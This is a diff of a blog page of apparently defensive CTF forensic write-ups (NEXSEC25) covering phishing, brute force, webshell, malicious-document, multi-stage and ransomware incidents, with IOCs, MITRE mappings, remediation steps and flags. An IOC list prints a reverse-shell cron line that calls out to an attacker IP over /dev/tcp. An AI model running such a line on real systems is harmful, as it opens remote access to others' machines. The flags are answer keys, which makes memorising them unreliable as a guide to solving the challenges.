@@ -1911,8 +1911,7 @@
 <p>Target: Berjaya Company</p>
 <p>Compromised System: Workstation</p>
 <p>Compromised User: azman</p>
-<p><strong>Executive Summary</strong></p>
-<p>Berjaya Company experienced a confirmed system compromise initiated via a targeted spear-phishing attack. The adversary successfully bypassed perimeter defenses established a persistent Command &amp; Control (C2) channel, escalated privileges to administrative level, and staged sensitive user data for exfiltration. The attack leveraged “Living off the Land” (LotL) techniques, abusing trusted platforms like GitHub and PowerShell to evade detection.</p>
+<h3 id="Executive-Summary"><a href="#Executive-Summary" class="headerlink" title="Executive Summary"></a>Executive Summary</h3><p>Berjaya Company experienced a confirmed system compromise initiated via a targeted spear-phishing attack. The adversary successfully bypassed perimeter defenses established a persistent Command &amp; Control (C2) channel, escalated privileges to administrative level, and staged sensitive user data for exfiltration. The attack leveraged “Living off the Land” (LotL) techniques, abusing trusted platforms like GitHub and PowerShell to evade detection.</p>
 <p><strong>Attack Severity:</strong> CRITICAL</p>
 <p><strong>Key Findings:</strong></p>
 <ul>
@@ -1975,7 +1974,7 @@
 <li>The output shows WINWORD.EXE was executed with the file path C:\Users\azman\Downloads\Jemputan_Bengkel_Strategik.docx.</li>
 </ol>
 <p><strong>Conclusion:</strong> The infection originated from the file <strong>Jemputan_Bengkel_Strategik.docx</strong>.</p>
-<p>Flag: NEXSEC25{Jemputan_Bengkel_Strategik.docx}</p>
+<p><strong>Flag:</strong> NEXSEC25{Jemputan_Bengkel_Strategik.docx}</p>
 <p><strong>MEMOIR #2</strong></p>
 <p>What is the IP address of the primary C2 server?</p>
 <p>NEXSEC25{ip}</p>
@@ -2162,16 +2161,14 @@
 <li>The logs reveal the command Compress-Archive -Path “C:\Users\azman\Documents” -DestinationPath “C:\Users\azman\Downloads\Documents.zip” -Force. This confirms the exfiltrated file is Documents.zip.</li>
 </ol>
 <p><strong>Conclusion:</strong> The exfiltrated file name is <strong>Documents.zip</strong>.</p>
-<p>Flag: NEXSEC25{Documents.zip}</p>
-<p>Full Attack Chain Diagram</p>
-<p><img  
+<p><strong>Flag:</strong> NEXSEC25{Documents.zip}</p>
+<h3 id="Full-Attack-Chain-Diagram"><a href="#Full-Attack-Chain-Diagram" class="headerlink" title="Full Attack Chain Diagram"></a>Full Attack Chain Diagram</h3><p><img  
                      lazyload
                      src="/images/loading.svg"
                      data-src="/../image/mcmcctf/memoir/image15.png"
                       alt="A screenshot of a computer program AI-generated content may be incorrect."
                 ></p>
-<p><strong>Attack Chain Reconstruction</strong></p>
-<p><strong>Phase 1: Initial Access</strong></p>
+<h3 id="Attack-Chain-Reconstruction"><a href="#Attack-Chain-Reconstruction" class="headerlink" title="Attack Chain Reconstruction"></a>Attack Chain Reconstruction</h3><p><strong>Phase 1: Initial Access</strong></p>
 <p><strong>Timeframe:</strong> 2025-12-11 ~19:50 UTC</p>
 <ul>
 <li>User azman downloads and opens Jemputan_Bengkel_Strategik.docx.</li>
@@ -2207,8 +2204,7 @@
 <ul>
 <li>User documents compressed into Documents.zip.</li>
 </ul>
-<p><strong>Security Vulnerabilities Identified</strong></p>
-<p><strong>Critical Issues</strong></p>
+<h3 id="Security-Vulnerabilities-Identified"><a href="#Security-Vulnerabilities-Identified" class="headerlink" title="Security Vulnerabilities Identified"></a>Security Vulnerabilities Identified</h3><p><strong>Critical Issues</strong></p>
 <ol>
 <li><strong>Endpoint Protection Failure</strong> (CRITICAL)<ul>
 <li>Failed to block execution of unverified binaries (team.exe, mk.exe).</li>
@@ -2230,8 +2226,7 @@
 </ul>
 </li>
 </ol>
-<p><strong>Recommended Remediation Steps</strong></p>
-<p><strong>Immediate Actions (Within 24 Hours)</strong></p>
+<h3 id="Recommended-Remediation-Steps"><a href="#Recommended-Remediation-Steps" class="headerlink" title="Recommended Remediation Steps"></a>Recommended Remediation Steps</h3><p><strong>Immediate Actions (Within 24 Hours)</strong></p>
 <ol>
 <li><strong>Containment:</strong><ul>
 <li>Isolate workstation 192.168.8.34.</li>
@@ -2959,15 +2954,13 @@
 <p>Flag Recovered: nexsec25{dyn4m1c_d3x_kn0w13d93_941n3d!}</p>
 <p>This investigation demonstrated advanced Android malware reverse engineering skills, successfully defeating multi-layer encryption, dynamic code loading, and sophisticated obfuscation techniques. The malware’s use of legitimate Android APIs (Accessibility Service) and trusted infrastructure (GitHub) highlights the evolving threat landscape in mobile security.</p>
 <hr>
-<hr>
 <h2 id="Security-Incident-Brute-Force-Attack"><a href="#Security-Incident-Brute-Force-Attack" class="headerlink" title="Security Incident - Brute Force Attack"></a>Security Incident - Brute Force Attack</h2><p><strong>Security Incident</strong></p>
 <p><strong>Case:</strong> Unauthorized System Access - Brute Force Attack</p>
 <p><strong>Target:</strong> Company Server (DESKTOP-1K9LKBU)</p>
 <p><strong>Compromised System:</strong> Windows Server</p>
 <p><strong>Compromised User:</strong> webadmin</p>
 <hr>
-<p><strong>Executive Summary</strong></p>
-<p>The Company Server (DESKTOP-1K9LKBU) experienced a confirmed system compromise resulting from a sustained brute-force attack against network authentication services. The adversary successfully bypassed authentication mechanisms after thousands of attempts, compromising an administrative account and establishing a foothold for potential lateral movement. The attack leveraged NTLM network authentication, indicating a targeting of SMB or RPC services.</p>
+<h3 id="Executive-Summary-1"><a href="#Executive-Summary-1" class="headerlink" title="Executive Summary"></a>Executive Summary</h3><p>The Company Server (DESKTOP-1K9LKBU) experienced a confirmed system compromise resulting from a sustained brute-force attack against network authentication services. The adversary successfully bypassed authentication mechanisms after thousands of attempts, compromising an administrative account and establishing a foothold for potential lateral movement. The attack leveraged NTLM network authentication, indicating a targeting of SMB or RPC services.</p>
 <p><strong>Attack Severity:</strong> <strong>CRITICAL</strong></p>
 <p><strong>Key Findings:</strong></p>
 <ul>
@@ -3017,15 +3010,13 @@
 <p>Conclusion: The attacker successfully compromised the webadmin account at 12:35:23 PM.</p>
 <p><strong>Flag:</strong> nexsec25{12&#x2F;13&#x2F;2025_12:35:23PM_webadmin}</p>
 <hr>
-<p><strong>Full Attack Chain Diagram</strong></p>
-<p><img  
+<h3 id="Full-Attack-Chain-Diagram-1"><a href="#Full-Attack-Chain-Diagram-1" class="headerlink" title="Full Attack Chain Diagram"></a>Full Attack Chain Diagram</h3><p><img  
                      lazyload
                      src="/images/loading.svg"
                      data-src="/../image/mcmcctf/security/image3.png"
                       alt="A diagram of a diagram AI-generated content may be incorrect."
                 ></p>
-<p><strong>Attack Chain Reconstruction</strong></p>
-<p>Phase 1: Anti-Forensics &amp; Reconnaissance</p>
+<h3 id="Attack-Chain-Reconstruction-1"><a href="#Attack-Chain-Reconstruction-1" class="headerlink" title="Attack Chain Reconstruction"></a>Attack Chain Reconstruction</h3><p><strong>Phase 1: Anti-Forensics &amp; Reconnaissance</strong></p>
 <p><strong>Timeframe:</strong> Dec 13, 00:26:03 (GMT+8)</p>
 <ul>
 <li><strong>Log Clearing:</strong> The Security Audit Log was cleared by user amin (Event ID 1102) prior to the attack, likely to remove evidence of initial staging.</li>
@@ -3071,8 +3062,7 @@
 </li>
 </ul>
 <hr>
-<p><strong>Recommended Remediation Steps</strong></p>
-<p><strong>Immediate Actions (Within 24 Hours)</strong></p>
+<h3 id="Recommended-Remediation-Steps-1"><a href="#Recommended-Remediation-Steps-1" class="headerlink" title="Recommended Remediation Steps"></a>Recommended Remediation Steps</h3><p><strong>Immediate Actions (Within 24 Hours)</strong></p>
 <ul>
 <li><strong>Containment:</strong><ul>
 <li>Immediately disable the webadmin account.</li>
@@ -3099,8 +3089,7 @@
 </li>
 </ul>
 <hr>
-<p><strong>MITRE ATT&amp;CK Table</strong></p>
-<table>
+<h3 id="MITRE-ATT-CK-Table"><a href="#MITRE-ATT-CK-Table" class="headerlink" title="MITRE ATT&amp;CK Table"></a>MITRE ATT&amp;CK Table</h3><table>
 <thead>
 <tr>
 <th><strong>Tactic</strong></th>
@@ -3140,16 +3129,14 @@
 <td>Explicit credential usage (Event 4648)</td>
 </tr>
 </tbody></table>
-<p><strong>Conclusion</strong></p>
-<p>This investigation confirms a successful brute-force compromise of an administrative account on a critical company server. The attacker leveraged a weak password policy and the absence of account lockout mechanisms to gain unauthorized access via network authentication. The breach timeline has been fully reconstructed, and immediate remediation is required to secure the network infrastructure.</p>
+<h3 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h3><p>This investigation confirms a successful brute-force compromise of an administrative account on a critical company server. The attacker leveraged a weak password policy and the absence of account lockout mechanisms to gain unauthorized access via network authentication. The breach timeline has been fully reconstructed, and immediate remediation is required to secure the network infrastructure.</p>
 <hr>
 <h2 id="Breadcrumbs-Web-Server-Compromise"><a href="#Breadcrumbs-Web-Server-Compromise" class="headerlink" title="Breadcrumbs - Web Server Compromise"></a>Breadcrumbs - Web Server Compromise</h2><p>BREADCRUMBS - WEB SERVER COMPROMISE INVESTIGATION</p>
 <p><strong>Incident Type:</strong> Web Application Compromise &amp; Post-Exploitation Analysis</p>
 <p><strong>Target Entity:</strong> Ubuntu Web Server (192.168.8.36)</p>
 <p><strong>Evidence File:</strong> capture.pcap (86.5 kB)</p>
 <hr>
-<p>Executive Summary</p>
-<p>Analytic Judgment:</p>
+<h3 id="Executive-Summary-2"><a href="#Executive-Summary-2" class="headerlink" title="Executive Summary"></a>Executive Summary</h3><p><strong>Analytic Judgment:</strong></p>
 <p>A sophisticated web application attack was detected against an Ubuntu 24.04.3 LTS web server hosting a recruitment portal. The adversary successfully exploited a file upload vulnerability in the resume submission functionality to upload a webshell, subsequently establishing persistent reverse shell access to the compromised system. Through comprehensive network traffic analysis of the captured PCAP file, we reconstructed the complete post-exploitation activity chain, revealing multiple privilege escalation attempts, reconnaissance operations, and establishment of a cron-based persistence mechanism. The attacker demonstrated advanced operational security knowledge through systematic enumeration, attempted lateral movement, and establishment of automated re-exploitation capabilities.</p>
 <p><strong>Attack Severity:</strong> CRITICAL</p>
 <p>Key Findings:</p>
@@ -3170,8 +3157,7 @@
 <li>Attack chain demonstrates intermediate-to-advanced adversary tradecraft</li>
 </ul>
 <hr>
-<p>Challenge Description</p>
-<p>Scenario:</p>
+<h3 id="Challenge-Description"><a href="#Challenge-Description" class="headerlink" title="Challenge Description"></a>Challenge Description</h3><p><strong>Scenario:</strong></p>
 <p>Following a security alert about suspicious outbound connections from a web server, the security team captured network traffic for forensic analysis. Initial investigation revealed that an attacker had successfully uploaded a webshell through the recruitment portal’s resume submission feature and established a reverse shell connection. The PCAP file contains the complete post-exploitation activity, including all commands executed by the attacker, data exfiltration attempts, and persistence mechanisms.</p>
 <p><strong>Objective:</strong> Analyze the network traffic to answer 8 critical incident response questions about the attacker’s activities.</p>
 <p><strong>Flag Format:</strong> nexsec25{…}</p>
@@ -3569,8 +3555,7 @@
 <li><strong>Description:</strong> “web” (possibly web server administrator)</li>
 </ul>
 <p>Flag: nexsec25{sysadmin}</p>
-<p><strong>Attack Chain Reconstruction</strong></p>
-<p><strong>Phase 1: Initial Access</strong></p>
+<h3 id="Attack-Chain-Reconstruction-2"><a href="#Attack-Chain-Reconstruction-2" class="headerlink" title="Attack Chain Reconstruction"></a>Attack Chain Reconstruction</h3><p><strong>Phase 1: Initial Access</strong></p>
 <ul>
 <li><strong>Timeframe:</strong> T+0 to T+988 seconds</li>
 <li>The attacker uploaded a file named malicious_webshell.php.pdf to the &#x2F;var&#x2F;www&#x2F;html&#x2F;uploads&#x2F; directory.</li>
@@ -3615,8 +3600,7 @@
                       alt="A screenshot of a computer program AI-generated content may be incorrect."
                 ></p>
 <hr>
-<p><strong>Security Vulnerabilities Identified</strong></p>
-<p>Critical Issues</p>
+<h3 id="Security-Vulnerabilities-Identified-1"><a href="#Security-Vulnerabilities-Identified-1" class="headerlink" title="Security Vulnerabilities Identified"></a>Security Vulnerabilities Identified</h3><p><strong>Critical Issues</strong></p>
 <ol>
 <li>File Upload Validation Bypass (CRITICAL)</li>
 </ol>
@@ -3629,8 +3613,7 @@
 <li>PHP Execution in Upload Directory (CRITICAL)</li>
 </ol>
 <p>Apache executes PHP files in uploads directory with web server privileges.</p>
-<p><strong>Indicators of Compromise (IOCs)</strong></p>
-<p><strong>Network Indicators:</strong></p>
+<h3 id="Indicators-of-Compromise-IOCs"><a href="#Indicators-of-Compromise-IOCs" class="headerlink" title="Indicators of Compromise (IOCs)"></a>Indicators of Compromise (IOCs)</h3><p><strong>Network Indicators:</strong></p>
 <ul>
 <li>Attacker IP: 172.16.23.13 - C2 Port: 4444&#x2F;TCP</li>
 <li>Connection Pattern: Outbound every 60 seconds</li>
@@ -3642,8 +3625,7 @@
 <li><em>Cron Entry:</em> * * * * &#x2F;bin&#x2F;bash -c bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;172.16.23.13&#x2F;4444 0&gt;&amp;1</li>
 </ul>
 <p><strong>Process Indicators:</strong> - Multiple bash processes under www-data - Parent: apache2 php bash -i</p>
-<p><strong>Recommended Remediation Steps</strong></p>
-<p><strong>Immediate Actions (Within 1 Hour):</strong></p>
+<h3 id="Recommended-Remediation-Steps-2"><a href="#Recommended-Remediation-Steps-2" class="headerlink" title="Recommended Remediation Steps"></a>Recommended Remediation Steps</h3><p><strong>Immediate Actions (Within 1 Hour):</strong></p>
 <ol>
 <li>Kill reverse shell processes: pkill -u www-data bash</li>
 <li>Remove malicious crontab: crontab -r -u www-data</li>
@@ -3665,8 +3647,7 @@
 <li>Security awareness training</li>
 </ol>
 <hr>
-<p><strong>MITRE ATT&amp;CK Mapping</strong></p>
-<table>
+<h3 id="MITRE-ATT-CK-Mapping"><a href="#MITRE-ATT-CK-Mapping" class="headerlink" title="MITRE ATT&amp;CK Mapping"></a>MITRE ATT&amp;CK Mapping</h3><table>
 <thead>
 <tr>
 <th>Tactic</th>
@@ -3731,16 +3712,14 @@
 </tr>
 </tbody></table>
 <hr>
-<p><strong>Conclusion</strong></p>
-<p>This investigation successfully reconstructed the full attack timeline from the PCAP evidence. The attacker gained initial access via a file upload vulnerability, established persistence using cron, and attempted but failed to escalate privileges or move laterally to the sysadmin account. The immediate neutralization of the cron job and patching of the web application are required to secure the system.</p>
+<h3 id="Conclusion-1"><a href="#Conclusion-1" class="headerlink" title="Conclusion"></a>Conclusion</h3><p>This investigation successfully reconstructed the full attack timeline from the PCAP evidence. The attacker gained initial access via a file upload vulnerability, established persistence using cron, and attempted but failed to escalate privileges or move laterally to the sysadmin account. The immediate neutralization of the cron job and patching of the web application are required to secure the system.</p>
 <hr>
 <h2 id="Rembayung-Malicious-Document-Analysis"><a href="#Rembayung-Malicious-Document-Analysis" class="headerlink" title="Rembayung - Malicious Document Analysis"></a>Rembayung - Malicious Document Analysis</h2><p><strong>MALWARE ANALYSIS REPORT: REMBAYUNG</strong></p>
 <p>Incident Type: Phishing &#x2F; Malicious Document Analysis</p>
 <p>Target Entity: Enterprise Workstations (Windows)</p>
 <p>Evidence File: Jemputan ke Majlis Perasmian Restaurant Rembayung.docm</p>
 <hr>
-<p><strong>1. Executive Summary</strong></p>
-<p>Analytic Judgment:</p>
+<h3 id="Executive-Summary-3"><a href="#Executive-Summary-3" class="headerlink" title="Executive Summary"></a>Executive Summary</h3><p>Analytic Judgment:</p>
 <p>A targeted phishing attack utilizing a malicious Microsoft Word Document (.docm) was intercepted. The adversary employed “Property-Based Staging,” a sophisticated evasion technique where the executable payload is hidden within the document’s metadata (XML properties) rather than the document body, effectively bypassing basic static analysis.</p>
 <p><strong>Attack Severity:</strong> <strong>HIGH</strong></p>
 <p><strong>Key Findings:</strong></p>
@@ -3821,15 +3800,13 @@
 <p>14 All attacker-issued commands are executed by the command interpreter and their output is transmitted over the TCP connection</p>
 <p>15 Upon termination of the shell session the malware closes the socket and releases Winsock resources using closesocket and WSACleanup</p>
 <p>16 The program exits cleanly without installing persistence mechanisms or leaving additional artifacts</p>
-<p><strong>Full Attack Chain Diagram</strong></p>
-<p><img  
+<h3 id="Full-Attack-Chain-Diagram-2"><a href="#Full-Attack-Chain-Diagram-2" class="headerlink" title="Full Attack Chain Diagram"></a>Full Attack Chain Diagram</h3><p><img  
                      lazyload
                      src="/images/loading.svg"
                      data-src="/../image/mcmcctf/rembayung/image5.png"
                       alt="A diagram of a diagram AI-generated content may be incorrect."
                 ></p>
-<p><strong>Attack Chain Reconstruction</strong></p>
-<p><strong>Phase 1: Delivery &amp; Reconnaissance</strong></p>
+<h3 id="Attack-Chain-Reconstruction-3"><a href="#Attack-Chain-Reconstruction-3" class="headerlink" title="Attack Chain Reconstruction"></a>Attack Chain Reconstruction</h3><p><strong>Phase 1: Delivery &amp; Reconnaissance</strong></p>
 <p><strong>Timeframe:</strong> T+0 minutes</p>
 <ul>
 <li><strong>Vector:</strong> The user receives the file Jemputan ke Majlis Perasmian Restaurant Rembayung.docm via email.</li>
@@ -3862,8 +3839,7 @@
 <li><strong>Capabilities:</strong> It establishes a raw TCP connection to the attacker’s listener, spawning cmd.exe and piping stdin&#x2F;stdout&#x2F;stderr to the socket, granting full remote CLI access.</li>
 </ul>
 <hr>
-<p><strong>4. MITRE ATT&amp;CK Mapping</strong></p>
-<table>
+<h3 id="MITRE-ATT-CK-Mapping-1"><a href="#MITRE-ATT-CK-Mapping-1" class="headerlink" title="MITRE ATT&amp;CK Mapping"></a>MITRE ATT&amp;CK Mapping</h3><table>
 <thead>
 <tr>
 <th><strong>Tactic</strong></th>
@@ -3922,8 +3898,7 @@
 </tr>
 </tbody></table>
 <hr>
-<p><strong>Indicators of Compromise (IOCs)</strong></p>
-<ul>
+<h3 id="Indicators-of-Compromise-IOCs-1"><a href="#Indicators-of-Compromise-IOCs-1" class="headerlink" title="Indicators of Compromise (IOCs)"></a>Indicators of Compromise (IOCs)</h3><ul>
 <li><strong>Filename:</strong> Jemputan ke Majlis Perasmian Restaurant Rembayung.docm</li>
 <li><strong>Filename:</strong> download.exe (extracted form)</li>
 </ul>
@@ -3941,13 +3916,12 @@
 <li><strong>VBA Function:</strong> Project.ThisDocument.AutoOpen.</li>
 </ul>
 <hr>
-<p><strong>6. Conclusion</strong></p>
-<p>The file Jemputan ke Majlis Perasmian Restaurant Rembayung.docm is a confirmed malicious dropper. It leverages a combination of social engineering (fake invitation) and technical evasion (metadata hiding) to deploy a reverse shell. The presence of the INCLUDEPICTURE field serves as an early-warning system for the attacker to know when a victim has engaged with the file.</p>
+<h3 id="Conclusion-2"><a href="#Conclusion-2" class="headerlink" title="Conclusion"></a>Conclusion</h3><p>The file Jemputan ke Majlis Perasmian Restaurant Rembayung.docm is a confirmed malicious dropper. It leverages a combination of social engineering (fake invitation) and technical evasion (metadata hiding) to deploy a reverse shell. The presence of the INCLUDEPICTURE field serves as an early-warning system for the attacker to know when a victim has engaged with the file.</p>
 <hr>
-<h2 id="Birthday-Trap-Multi-Stage-Malware"><a href="#Birthday-Trap-Multi-Stage-Malware" class="headerlink" title="Birthday Trap - Multi-Stage Malware"></a>Birthday Trap - Multi-Stage Malware</h2><h1 id="BIRTHDAY-TRAP"><a href="#BIRTHDAY-TRAP" class="headerlink" title="BIRTHDAY TRAP"></a>BIRTHDAY TRAP</h1><p><strong>Incident Type</strong>: Malware Analysis</p>
+<h2 id="Birthday-Trap-Multi-Stage-Malware"><a href="#Birthday-Trap-Multi-Stage-Malware" class="headerlink" title="Birthday Trap - Multi-Stage Malware"></a>Birthday Trap - Multi-Stage Malware</h2><p><strong>Incident Type</strong>: Malware Analysis</p>
 <p><strong>Target Entity</strong>: Aminah’s Workstation</p>
 <p><strong>Evidence File</strong>: Happy_Birthday.png</p>
-<h2 id="1-Executive-Summary"><a href="#1-Executive-Summary" class="headerlink" title="1. Executive Summary"></a>1. Executive Summary</h2><p><strong>Analytic Judgment</strong>:</p>
+<h3 id="Executive-Summary-4"><a href="#Executive-Summary-4" class="headerlink" title="Executive Summary"></a>Executive Summary</h3><p><strong>Analytic Judgment</strong>:</p>
 <p>Aminah’s workstation was compromised after she interacted with a malicious email attachment disguised as a birthday greeting image. The adversary employed a sophisticated multi-stage attack chain leveraging “Living off the Land” (LotL) techniques, abusing trusted binaries like mshta.exe and PowerShell to evade detection. The investigation revealed a ZIP archive masquerading as a PNG image, containing a malicious Windows shortcut (.lnk) file that executed a remote HTA script. The script downloaded and decoded a XOR-encrypted payload, ultimately revealing a PowerShell script containing the hidden flag.</p>
 <p><strong>Attack Severity</strong>: HIGH</p>
 <p><strong>Key Findings</strong>:</p>
@@ -3959,7 +3933,7 @@
 <li>The real flag was hidden in the comments of the PowerShell script: nexsec2025{P0w3rSh3ll_C0mm3nt5_H1d3_S3cr3ts!}</li>
 <li>Attack chain demonstrates advanced obfuscation and evasion techniques.</li>
 </ul>
-<h3 id="Birthday-Trap"><a href="#Birthday-Trap" class="headerlink" title="Birthday Trap"></a>Birthday Trap</h3><p>Your colleague Aminah received a birthday greeting email with an attached image file “happy_birthday.png”. She mentioned seeing a warning dialog when she clicked it, but she forgot what it said then her PC started acting strange. Do NOT execute or click this file!- perform static analysis only to find the flag safely. Analyze the happy_birthday.png and find the flag hidden in the malware.</p>
+<p>Your colleague Aminah received a birthday greeting email with an attached image file “happy_birthday.png”. She mentioned seeing a warning dialog when she clicked it, but she forgot what it said then her PC started acting strange. Do NOT execute or click this file!- perform static analysis only to find the flag safely. Analyze the happy_birthday.png and find the flag hidden in the malware.</p>
 <p><strong>Objective</strong>: Identify the flag hidden in the malware through static analysis.</p>
 <p><strong>Flag Format</strong>: nexsec2025{flag_content}</p>
 <p><strong>Evidence</strong>:</p>
@@ -4075,15 +4049,13 @@
 </ol>
 <p><strong>Conclusion</strong>: Through systematic static analysis, we successfully identified and decoded the multi-stage malware without executing any malicious code. The flag was discovered in the comments of the final PowerShell payload.</p>
 <p><strong>Flag</strong>: nexsec2025{P0w3rSh3ll_C0mm3nt5_H1d3_S3cr3ts!}</p>
-<p>Full Attack Chain Diagram</p>
-<p><img  
+<h3 id="Full-Attack-Chain-Diagram-3"><a href="#Full-Attack-Chain-Diagram-3" class="headerlink" title="Full Attack Chain Diagram"></a>Full Attack Chain Diagram</h3><p><img  
                      lazyload
                      src="/images/loading.svg"
                      data-src="/../image/mcmcctf/birthday/image11.png"
                       alt="A screenshot of a computer program AI-generated content may be incorrect."
                 ></p>
-<p><strong>Attack Chain Reconstruction</strong></p>
-<p><strong>Phase 1: Initial Access</strong></p>
+<h3 id="Attack-Chain-Reconstruction-4"><a href="#Attack-Chain-Reconstruction-4" class="headerlink" title="Attack Chain Reconstruction"></a>Attack Chain Reconstruction</h3><p><strong>Phase 1: Initial Access</strong></p>
 <ul>
 <li><strong>Timeframe:</strong> ~19:29 UTC</li>
 <li>Aminah received a spear-phishing email with happy_birthday.png attached.</li>
@@ -4112,8 +4084,7 @@
 <li>The final payload, winp.ps1, was created in %TEMP%.</li>
 <li>Static analysis revealed the flag hidden within the script’s comments.</li>
 </ul>
-<p><strong>Security Vulnerabilities Identified</strong></p>
-<p><strong>Critical Issues</strong></p>
+<h3 id="Security-Vulnerabilities-Identified-2"><a href="#Security-Vulnerabilities-Identified-2" class="headerlink" title="Security Vulnerabilities Identified"></a>Security Vulnerabilities Identified</h3><p><strong>Critical Issues</strong></p>
 <ol>
 <li><p><strong>Endpoint Protection Failure (CRITICAL)</strong></p>
 <ul>
@@ -4141,8 +4112,7 @@
 </ul>
 </li>
 </ol>
-<p><strong>Recommended Remediation Steps</strong></p>
-<p><strong>Immediate Actions (Within 24 Hours)</strong></p>
+<h3 id="Recommended-Remediation-Steps-3"><a href="#Recommended-Remediation-Steps-3" class="headerlink" title="Recommended Remediation Steps"></a>Recommended Remediation Steps</h3><p><strong>Immediate Actions (Within 24 Hours)</strong></p>
 <p><strong>Containment:</strong></p>
 <ul>
 <li>Isolate Aminah’s workstation from the network.</li>
@@ -4169,8 +4139,7 @@
 <li>Deploy EDR to detect LOLBin abuse (mshta, certutil) and PowerShell obfuscation.</li>
 <li>Monitor for file downloads to %TEMP% followed by immediate execution.</li>
 </ul>
-<p><strong>MITRE ATT&amp;CK Table</strong></p>
-<table>
+<h3 id="MITRE-ATT-CK-Table-1"><a href="#MITRE-ATT-CK-Table-1" class="headerlink" title="MITRE ATT&amp;CK Table"></a>MITRE ATT&amp;CK Table</h3><table>
 <thead>
 <tr>
 <th><strong>Tactic</strong></th>
@@ -4216,14 +4185,13 @@
 <td>HTTPS traffic to GitHub</td>
 </tr>
 </tbody></table>
-<h2 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h2><p>This investigation successfully identified and analyzed a sophisticated multi-stage malware attack targeting Aminah’s workstation. Through systematic static analysis, we uncovered a “Living off the Land” attack chain that abused trusted Windows binaries to deliver an encrypted payload. The flag was successfully recovered from the decrypted PowerShell script without executing the malicious code.</p>
+<h3 id="Conclusion-3"><a href="#Conclusion-3" class="headerlink" title="Conclusion"></a>Conclusion</h3><p>This investigation successfully identified and analyzed a sophisticated multi-stage malware attack targeting Aminah’s workstation. Through systematic static analysis, we uncovered a “Living off the Land” attack chain that abused trusted Windows binaries to deliver an encrypted payload. The flag was successfully recovered from the decrypted PowerShell script without executing the malicious code.</p>
 <hr>
 <h2 id="OhMyFiles-Ransomware-Investigation"><a href="#OhMyFiles-Ransomware-Investigation" class="headerlink" title="OhMyFiles - Ransomware Investigation"></a>OhMyFiles - Ransomware Investigation</h2><p>OHMYFILES</p>
 <p>Case: Ransomware Infection &#x2F; Software Exploitation</p>
 <p>Target: Fakhri Workstation</p>
 <p>Evidence File: FAKHRIWORKSTATION_20251211.E01</p>
-<p><strong>Executive Summary</strong></p>
-<p>The “Fakhri Workstation” was compromised by a targeted ransomware attack initiated through a malicious archive file. Forensic analysis of the disk image confirms that the attacker exploited a critical vulnerability in WinRAR (CVE-2025-8088) to perform a path traversal attack. This exploit dropped a malicious shortcut (.lnk) into the Windows Startup folder, establishing persistence and executing a ransomware binary masquerading as svchost.exe.</p>
+<h3 id="Executive-Summary-5"><a href="#Executive-Summary-5" class="headerlink" title="Executive Summary"></a>Executive Summary</h3><p>The “Fakhri Workstation” was compromised by a targeted ransomware attack initiated through a malicious archive file. Forensic analysis of the disk image confirms that the attacker exploited a critical vulnerability in WinRAR (CVE-2025-8088) to perform a path traversal attack. This exploit dropped a malicious shortcut (.lnk) into the Windows Startup folder, establishing persistence and executing a ransomware binary masquerading as svchost.exe.</p>
 <p>The malware, identified as ShadowCrypt, utilized a Python-based XOR encryption routine. Encryption keys were generated per file and stealthily stored in the Windows Registry. The investigation team successfully reverse-engineered the malware, recovered the encryption keys, and developed a decryption routine to recover critical business documents.</p>
 <p><strong>Attack Severity</strong>: CRITICAL</p>
 <p><strong>Key Findings:</strong></p>
@@ -4476,15 +4444,13 @@
 </ol>
 <p><strong>Conclusion:</strong> Recovered file of the XOR encrypted file and using key from the registry</p>
 <p>Flag: nexsec2025{sh4d0w_crypt_m4st3r_2025}</p>
-<p><strong>Full Attack Chain Diagram</strong></p>
-<p><img  
+<h3 id="Full-Attack-Chain-Diagram-4"><a href="#Full-Attack-Chain-Diagram-4" class="headerlink" title="Full Attack Chain Diagram"></a>Full Attack Chain Diagram</h3><p><img  
                      lazyload
                      src="/images/loading.svg"
                      data-src="/../image/mcmcctf/ohmyfiles/image17.png"
                       alt="A screenshot of a computer program AI-generated content may be incorrect."
                 ></p>
-<p><strong>Full Attack Chain Reconstruction</strong></p>
-<p>Phase 1: Initial Access &amp; Exploitation</p>
+<h3 id="Full-Attack-Chain-Reconstruction"><a href="#Full-Attack-Chain-Reconstruction" class="headerlink" title="Full Attack Chain Reconstruction"></a>Full Attack Chain Reconstruction</h3><p><strong>Phase 1: Initial Access &amp; Exploitation</strong></p>
 <ul>
 <li>Timeframe: Pre-Infection</li>
 <li>User downloads and attempts to extract a malicious archive $R96XXEK.rar.</li>
@@ -4509,8 +4475,7 @@
 <li>Files are renamed with the .lock extension.</li>
 <li>Unique encryption keys for each file are generated and written to HKCU\Software\ShadowCrypt\Keys.</li>
 </ul>
-<p><strong>Security Vulnerabilities Identified</strong></p>
-<p><strong>Critical Issues</strong></p>
+<h3 id="Security-Vulnerabilities-Identified-3"><a href="#Security-Vulnerabilities-Identified-3" class="headerlink" title="Security Vulnerabilities Identified"></a>Security Vulnerabilities Identified</h3><p><strong>Critical Issues</strong></p>
 <p>Unpatched Software Vulnerability (CRITICAL)</p>
 <ul>
 <li>The workstation was running a vulnerable version of WinRAR (v7.12).</li>
@@ -4530,8 +4495,7 @@
 <ul>
 <li>The malware stored thousands of encryption keys in the User Registry Hive (HKCU) without triggering anomalous behavior alerts.</li>
 </ul>
-<p><strong>Remediation Recommendations</strong></p>
-<p>Immediate Actions (Within 24 Hours)</p>
+<h3 id="Remediation-Recommendations"><a href="#Remediation-Recommendations" class="headerlink" title="Remediation Recommendations"></a>Remediation Recommendations</h3><p>Immediate Actions (Within 24 Hours)</p>
 <p>Containment:</p>
 <ul>
 <li>Isolate the Fakhri Workstation to prevent network propagation (if worm capabilities exist).</li>
@@ -4610,8 +4574,7 @@
 <td>Files encrypted with .lock extension</td>
 </tr>
 </tbody></table>
-<p><strong>Conclusion</strong></p>
-<p>This investigation confirmed that the “OhMyFiles” incident was a targeted ransomware attack leveraging a known software vulnerability for initial access. The recovery of the encryption keys from the registry allowed for zero-loss data recovery. The incident highlights the critical need for third-party software patching and strict execution policies in user directories.</p>
+<h3 id="Conclusion-4"><a href="#Conclusion-4" class="headerlink" title="Conclusion"></a>Conclusion</h3><p>This investigation confirmed that the “OhMyFiles” incident was a targeted ransomware attack leveraging a known software vulnerability for initial access. The recovery of the encryption keys from the registry allowed for zero-loss data recovery. The incident highlights the critical need for third-party software patching and strict execution policies in user directories.</p>
 <hr>
